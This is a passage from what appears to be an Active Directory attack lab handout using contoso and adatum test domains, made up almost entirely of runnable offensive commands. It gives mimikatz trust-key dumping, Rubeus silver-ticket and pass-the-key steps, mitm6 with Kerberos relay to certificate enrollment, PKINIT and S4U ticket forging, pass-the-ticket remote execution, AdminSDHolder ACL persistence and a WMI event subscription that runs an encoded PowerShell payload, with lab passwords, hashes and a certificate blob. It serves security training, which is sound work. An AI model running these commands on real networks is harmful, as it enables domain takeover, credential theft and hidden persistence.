Import-Module E:\GOC213\DSInternals
ConvertTo-KerberosKey -Salt 'CONTOSO.COMhostcontoso-srv.contoso.com' -Iterations 4096
```

```powershell
(Get-ADReplAccount -Server contoso-dc -SamAccountName 'CONTOSO-SRV$').SupplementalCredentials.KerberosNew.Credentials
```

```cmd
klist purge

Rubeus.exe silver /aes256:ce9a5080b977df32dd52d986bcfedc9b465f62b89d5cc82b983bd41aa3c15fa4 /user:Admin /service:cifs/contoso-srv.contoso.com /printcmd /ptt /ldap /nowrap

dir \\contoso-srv.contoso.com\c$
```

### Cross-Forest Pass-the-Key

#### Dump Trust Credentials on DC

| Computer | User | Password |
|-|-|-|
| CONTOSO-DC | CONTOSO\Admin | Pa$$w0rd |

```cmd
\\local\GOC213\mimikatz\x64\mimikatz.exe
privilege::debug
lsadump::trust /patch
quit
```
#### Pass-the-Key

| Computer | User | Password |
|-|-|-|
| CONTOSO-DC | CONTOSO\Admin | Pa$$w0rd |

```cmd
\\local\GOC213\GhostPack\Rubeus.exe asktgt /user:CONTOSO$ /domain:adatum.com /rc4:e1874310c18a0dc8d5777b145a609b58 /outfile:adatum.kirbi /ptt
ldp.exe
```

### MITM6 + Kerberos Relay

#### Kerberos Relay to CA Web Enrollment

| Computer |
|-|
| Kali Linux |

```bash
sudo python3 krbrelayx/krbrelayx.py --victim contoso-pc2.contoso.com --adcs --target http://contoso-dc.contoso.com/certsrv/ --template Machine
```

#### MITM6

| Computer |
|-|
| Kali Linux |

```bash
sudo mitm6 --host-allowlist contoso-pc2.contoso.com --relay contoso-dc.contoso.com --domain contoso.com --no-ra
```

Now reboot CONTOSO-PC2.

#### Kerberos PKINIT

| Computer |
|-|
| Kali Linux |

```bash
python3 PKINITtools/gettgtpkinit.py 'CONTOSO/CONTOSO-PC2$' pc2.ccache -pfx-base64 MIIRVQIBAzCCEQ8GCSqGSIb3DQEHAaCCEQAEghD8MIIQ+DCCBy8GCSqGSIb3DQEHBqCCByAwggccAgEAMIIHFQYJKoZIhvcNAQcBMBwGCiqGSIb3DQEMAQMwDgQIq/De7ESq/nYCAggAgIIG6ERjOSpZrx6tSoZkgt2gj1Cxs0VmiU2iwOLkT/A10ZMtdn/I2jqfBNfua1Odm0B0eG6CA2ghD8+UgRF7znDELe7kd6M5YWkjCixpEN6qwmxb/tsTN4ChxbECLiy5MEYnALm+EFrxLLSdeftPyPiOxbMfy0C8F1q5K1LTnHplQO7Jt4/D5WRoxvoo3g5iaGbDyeMtNTLdvcU1gaRFunvGRXbS0zAj7opJg6E/avqFEb5oap7aVegEZTFWv4e5QhBJ5b/GV1AtMLgD1HjS/TmOtz23qRBSNAVbpnAHjT42YCpg55xwhf81gocd2pCrFcmRcINqao4aka6sguK9uHKTGdngYzoU/Ql3q74ulC6iVvT6L3Pg2VnsliMglirWIpvEsGrnAyL9qmjaelibwIy/wyppTFMEKfpC6sm5kwTwdjjWk42cjV76+ZaINkQCDbcG92hB6kmIOQWDre5l0dwp7cWEVLrbInHNDIr+yd4LfF+bXZKgFo6irhTnCSybLvUEaBj3ymKeY92xOz6VTfZorN6gran4K95guJF5wmNq5M7L9U9sIiltWltWbiOrKFOrobN7X08P12XFpJJinbYeGSLdFxwdMeBmgKLF0FUPH3ez+hQxovFuplNzCkCfAQhzP2R+u8gIUn8zGlMJMG/iYZbYWNPS1WtZd5lmm+ITi9Ro3WCYrPwcEGhS0Kodqrf3YzZehzWb9XvcOLYT7RrkOmzqYJxoXqdgbRR2LIgL5EuHPSMoQZKNAgxrsprR7X3fAzbSv1Ca9dYWG6GA1U92RFfvt74WbwAwmdiYO9AaoSQgW+ng/ZC7O1Gl1dJnkg/6eIKbQHkvFVggjligBbH6MvfoXZ9U2667rWO36fZLvKaPc8+hvBG8L0/9QMBrn1+tTK+kHPWkB9KiAGmDYhuAA2o+cfFEPxbrXKvWOPu+fD4775ZcQuvqC/3/psuS0h/0ZZl9yWcGG6yVgGE1lgr3NMG6+KXFcjQv0bPOVoijQfZhGGRP4NfUovc6e4WTHqIOzy4nA31yNnyoepFTKsdBUWMEbdPH4Pt/q6kSEA43rBPttw6i42xw0DHANpBETOeao32/IAHQoKyRjbjMewIyuyhfFZ4Uq26qwjY4fFeNuVhGUNYBmpMchUg8w+HgOUT6527wZoZRhvkyPrew/bjG3ENBJ0fjvXRIgODh6c4cI56jlyXsgAUoW7+vzCZLrObTtRQFWcoeJYomPrChXVT+uFpA/57/WTNv0OqFTH/FtIdhLS3iYBmKzGHSAs9lplcPwfvK4iduZ76gGpDp4epx64ff/stR0V6T+DP8WzLih/diO23uNt7eNC7iBPXrqKiq5BAx+00Aq1WAoQX7eN1Bc9ZLEztkqr+hEQ33fcWQM6L7JOpSSoQ8YuzkQcLfjdpl3nRV8pdhzJVcA/VkB4/jGluMpvPN3MmaRBh6D22ChTdxaWoTasnxMjY+yENGiJRzUUbEDDvP9xXdIaRLlKCXRJqNWpJNBldvcG6us/HZ7HBwS5+8jD5H2+KYjH87qpeGzK1px5azcveCYAUYI8zg8a6W3G2ITqCZrWzjRK9CzM+izQU0b7g5dgiqJ42QrjAze0LForBd6L6NfMx+BCfBb54NjhBVmC3wjF7zEbS7aa6qs6G47bYAgv9J6Fr4X6oqiTfuS0V4tEO4aSEOGVAPFGh3fFQOOXSv7jICezCyfeT0H/aSrny/T8BFRjjrKISvocY2hWR/w9Fgo7A4HIt3HB4QXL/HHcBaSYrbNDHNBo76aiZQsSvkOl8YTaOalvNwwP+EEKyN8DnHiwaEZqmG0Z8JK2C27IULgTVQf6cwsf4rnoN3TYvy4pjIWjfvtbXJLj1gJlUdDWdNVtz1t6UMMAwiOGu2Oas47V2d3++OODTZXSOBAJLvEkrG+bp1p47hxo/DLilmcEI1GgLxHTB/e9Ny9TVcsEt173efALVVzemwbMQ9Zi2nSvoGJFl0zDqWdUYmL003KnVwJriJzsF3l6ETI88okMEHYPEvJm2CVbhQKTYgNOFE01w3/XGTPS/jI/cblslUAZHhDW4VPGgKlLP1Y18MgjCkvcE1GqSRCTne7jPinWVwxG8hh9G4mbU4BnxBQP+YHBh/WbJ3tQfgWBCW9CCzJVkk527FAnWSTMFgzkoMdi4dkQIFjuhXDHIfDS93kRysr5/27TXDEz9kwsHkMxq3R4fS8ShVdDE+ojYVFafeIMvdUceNrMuRNwCdsaYaA+MtplIF4iYDTZjwZ/qDg1m8vdfHlugh0Wne4Pn+N+lIPS8YMi4hklg1QAraI/PSyqhg5qePotQyWY2srXUSpAyRFWdaryYFXEuyNmUQjpbcHwoA4rcwggnBBgkqhkiG9w0BBwGgggmyBIIJrjCCCaowggmmBgsqhkiG9w0BDAoBAqCCCW4wgglqMBwGCiqGSIb3DQEMAQMwDgQIDwjlaQqr4GMCAggABIIJSP7Gts0BTv+WeQzIBO7Rc2OzPpiEKc2W5Q6yZQ8ETzme8MUArJJ1Qhesy1oqrUxwSrIZkPq+28ntRhm5HA5cP1dSnbrubcSBofkmXbmsJWyMQC6/XG+KcjiB9OhvBACgmlnHHGTCZFKrJ+Xszku01y5rP1tcSYPJdXFjjSz8bxLePwaHNzd64sOJBGewGyYsHYyJ77XaeSR7Pp5pDZ3iInb99KCVGic+1UWCo+Xfv/q4YAdei3zFdj1OYyoiHWew6zvkMd4DbBcZLjNTyEGV7MZx1i/CPztDnyxI6gx1w23Yy6fUWyZRILKUFFfO4aglB9r9AG2k+Q8YrlSNjgI2dSGkxBZxHCjApvI1vOQdJUAc0Tiljc8R+jMaIRvH/c8vHntE9uW2iqHN+PL+7ppjWSnRWGQn9g8NaVKEuCjbh/n1DCuippoEC9ajuMVyNK6Hp6zAdsyp0PXcAkGX1amzfOZJRtBI6BFWebZ7TlI+bG52DWWzaMu+xMWuvyoUK9hT+JThhzbaAaZjNLUQ2woK6bexdSGiZaeB/yqstg88mn1n5OeFvNeITDtXBajd/nze3t1FXm8c9FfqTMd2QZa570M6Ttoq5vsot7VCa7ip7xk49jtr9n8Q7oO0ofn4pwSnwmxJjuauhViHhYvb6yFCiT5M9uUedhcc1lsWpqYt7QwYQ7XwIBs3WfGovBmq5zRQllNa6XzAelqiPliCqKM4nDD1oIlzbqL/PY5mzX5LCfMxIZz3WieFtTHDNDMgrXFJ/qaooD0dgDfl5nsBSak2eKknZEBt757gMuYYgmCj4biPYJ1xFTgqH0X7GFCzQG+f0zmz+OvBRbBput4ZAfhb257HyXx+9eCDaG8HE2eh6vojyQqZ7G5zU12J7ZYqmwibzBQYYT+h87ujbmIsul4HktGDquDWEP4M7y7gh4UtupT+uqKJ7ChjRYrM1oU7xrEV5oP3ROJpB5ymrfYvnBKOwEj6jqc4CvDUpUAGzFdk8Q8RyorY8SyyuqW70DHD4WCTB+ikjC0DwEMwLKNQcrJy7rwUJEsgGkgT0sKDWap0xJCJq/l/t+kU6hUMrVlQrnywC9jaIfbdN3eoYBvj6k5NZhy7uUirkcDt/nlg4pQBEt/aVOawrj1jDUl+pyd0rWka3Zp9pRXvoklLqcfwMzZ/mw9cqLZgUwsF41wGEloKGDJ8xkY4JVmTJvtJrmnv0lPrHirqTlCxlGNYiz59OiDUziv1sr1KZE5XO7rG5wdfs95kRLHNXoJ6Zt5MzjOzTMl1SfKeCIwVpaj6da11JV/YeWkN/Q3S7oZ4cTFqZ/OrZwFEz3RXScsYDRirt1bjwW4F6L8mK1gC0gWmIOwWR3fxi078u98cVsXUA/9TVv0cVnJzK0jOOEXfy9kXe0yRJBBJUdMT9/87x6v/ve9xLiRoxdLIm7ePtNh4q4V13xsYKJNqoOwetCQGmcQJP0aBsSyFmfAAlRwijZjBv+7+xsFKDTu+fNRlL43YBJrobg79n+rfA9ihqAZqskvsx0sikA5AumEk84rOPOJYX1hWk8gdFB4s8uGIObGW+HpBmWrO7Lr/bmYd9hVQ0tGKVJCdHX+jnEVSZCcSKoblhnTcbHZ64z8JBt1YC3BD8lSNn0PVWwd1MY+NHNv9OcuR0YYsI7PIftp69wxeaJVxYGUfXU4UMmU0UVg0uXEq7lAg3+krMzb4rVyWQGMZ3yFL/5qURKC8IDHRVmoSSoc8XopYvhAhSDb+S622xmdY3wT1c4HNRdXhvT2lrMnGFvSWl5Nocx0aVqeMEqeo0WjJwFIGoiUhJmMQ40eHV5suzwqyUDTVrRsFcnUmmRzAyxQymsjl6wukTz+CvdxpKoCltAYUr5mPPK7upHcx5qCZQYmSeOfz5z8HzJfhlHQ8+VEXgm1hNmS3HFhqJbosnqjrZ7+YxQCkBgM8Y1/RSd5Jjdlm8x/8XJ0e38AKmRavIa0ZYwjgoTkNnX3/4zyECUTDOO3wJ/hpL6F5mY8prTV2ImLmkjSmot+XSLiDejSJWg0vFaKkMuzin7qQzgGBcfXOFmkurtoqq1OEYSjZUC+UT7vIxQAh6kIDre+qRkAY9twxFYXI01wvuwtY+pb4gO0CvGeIPEXxXNBPOffoyHQnIAkBMgt2xLZKZcqkn3JEf8uJsbmV0dEMq+k8Cs+z99ChcIoGqoKrM2CJ9+LwVL4oP4DiZsN5Ixwb8YnrYijegOzI1HM6WX0x168QdZFuFgT0JvOjvGh2wTzT0e29O366kR41BpGCwUdmMSvyLxwqxCEnlN5kRrJ2BhHKtM0MEvI5EXnfYo18fNF+DXmYCXBV+ruZnm7ZlLBysUka60ApLLHtwdlR5BXm2ZaA2CADhO030u/erhIyUez7Nd/mreC++lp8hJU8zd0jh1y1X67yk0LiqdT6MAueLkVEY0a+slPFV11l9MwXwpACJipXYt1kqZ4/AMKBb8EPwiJv4gCplS1dAJZUfB/PJl20S03Mu2ijC5ffY3Dfz+QmuffwKI5PlxFnVp4fRxqsne33Xn7PQQD3TkaHlUN0ZduMglmJHy9AdzrkQQr//pT+V2n1KM/6M8atz794XCupIkQ0gf71gd1RQU+JEJ1RsyyDqBG6EAw7WoTATzBp1yOayORA488IDjPAf3R2dNV43lQKO8OXVRPRpmNIGGcmUb9/MOlVLkCU+VPee+jVgPC+mcLzva9e3KBmz0wnpkJNso+QWxQDv4KZzr3d2fBAnIJLgwcdaxRSztLmhW87Vy4QDDqQRDkdLZZCYYFN5I4qcxTuIQ0NDzo9oS5YSPzO3FeST9BkuMj7buUXrx2oR8b3BtHEoZB7Eo23qlalMvCqif01P8I2RFaZdGnGCrbvCQgktw2jbvt51jAz0Goa0iRt/Dy9gXja2tSoqmEeTrGhsyT1A9Poi5ENjaTpRvPHMVNLJvB9fgQ18sOYlBzOyEKJu08UEipw5CU0WsE/vbee3rFz21i4lI0Duh/XEx2TqTh/7ETUuNeNmy7gx28qMi3crsF0buY5VN7TnrWU5VRuMMxxhNw/S2+/ZPAKjsRPQi/SQBaFOP7r58Mg5Mj/AtHnGvGbTWk5in7tDk3iOLrAMkDjnHVSxolEhGOr8EJxkwQqjOTc9Ov8YEaQVu7AR1SWZGSAZeTuezElMCMGCSqGSIb3DQEJFTEWBBRl1l44leDu2pmnkD8o6tlJM0ghWzA9MDEwDQYJYIZIAWUDBAIBBQAEIHYatcNymIhuSiueVyIqekwPQwVye9P85D6Di2a1GgNsBAhlIQM6U8qzJA==
```

#### Kerberos S4U

| Computer |
|-|
| Kali Linux |

```bash
python3 PKINITtools/gets4uticket.py -v kerberos+ccache://contoso.com\\contoso-pc2\$:pc2.ccache@contoso-dc.contoso.com HOST/contoso-pc2.contoso.com@CONTOSO.COM Admin@contoso.com admin.ccache
```

#### Pass-the-Ticket

| Computer |
|-|
| Kali Linux |

```bash
KRB5CCNAME=admin.ccache impacket-wmiexec -k -no-pass contoso.com/Admin@contoso-pc2.contoso.com 'dir c:'
```

### Misconfigured Certificate Templates

```cmd
Rubeus.exe asktgt /user:admin /certificate:admin.pfx /password:admin /ptt /getcredentials
powershell.exe Invoke-Command -ComputerName contoso-dc.contoso.com -ScriptBlock { systeminfo }
```

```cmd
c:\Tools\Certify.exe find /vulnerable
```

## Persistence

### AdminSDHolder

| Computer | User | Password |
|-|-|-|
| CONTOSO-DC | CONTOSO\Admin | Pa$$w0rd |

```powershell
# Modify AdminSDHolder permissions
$adminSDHolder = 'CN=AdminSDHolder,CN=System,{0}' -f (Get-ADDomain).DistinguishedName
dsacls.exe $adminSDHolder /G 'Enterprise Key Admins:RPWP;msDS-KeyCredentialLink'

# Force ACL propagation
$pdc = (Get-ADDomain).PDCEmulator
$rootDSE = [adsi] "LDAP://$pdc/RootDSE"
$rootDSE.UsePropertyCache = $false
$rootDSE.Put('runProtectAdminGroupsTask', 1)
$rootDSE.SetInfo()
```

### WMI Persistence

#### Create

| Computer |
|-|
| Local |

```powershell
$payload = {
    Get-Date &gt;&gt; C:\test.txt
}

$encodedPayload = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($Payload))

$command = "powershell.exe -EncodedCommand $encodedPayload"

$timer = Set-WmiInstance -Class __IntervalTimerInstruction -Arguments @{
    IntervalBetweenEvents = ([UInt32] 10000)
    SkipIfPassed = $False
    TimerId = 'PayloadTrigger'
}

$filter = Set-WmiInstance -Class __EventFilter -Namespace root/subscription -Arguments @{
    EventNamespace = 'root/cimv2'
    Name = 'TimerTrigger'
    Query = "SELECT * FROM&nbsp;__TimerEvent WHERE&nbsp;TimerID = 'PayloadTrigger'"
    QueryLanguage = 'WQL'
}

$consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace root/subscription -Arguments @{
    Name = 'ExecuteEvilPowerShell'
    CommandLineTemplate = $command
}

$binding = Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root/subscription -Arguments @{
    Filter = $filter
    Consumer = $consumer
}
```

#### Check

| Computer |
|-|
| Local |

```cmd
E:\GOC213\WmiExplorer.exe
```

```cmd
E:\LabSources\Tools\SysInternals\Autoruns64.exe
```

#### Remove

| Computer |
|-|
| Local |

```powershell
$consumer = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter "Name = 'ExecuteEvilPowerShell'"
$filter = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter "Name = 'TimerTrigger'"
$binding = Get-WmiObject -Namespace root/subscription -Query "REFERENCES OF&nbsp;{$($consumer.__RELPATH)} WHERE&nbsp;ResultClass = __FilterToConsumerBinding"
$timer = Get-WmiObject -Namespace root/cimv2 -Class __IntervalTimerInstruction -Filter "TimerId = 'PayloadTrigger'"

Remove-WmiObject -InputObject $binding
Remove-WmiObject -InputObject $consumer
Remove-WmiObject -InputObject $filter
Remove-WmiObject -InputObject $timer
```

## DPAPI

TODO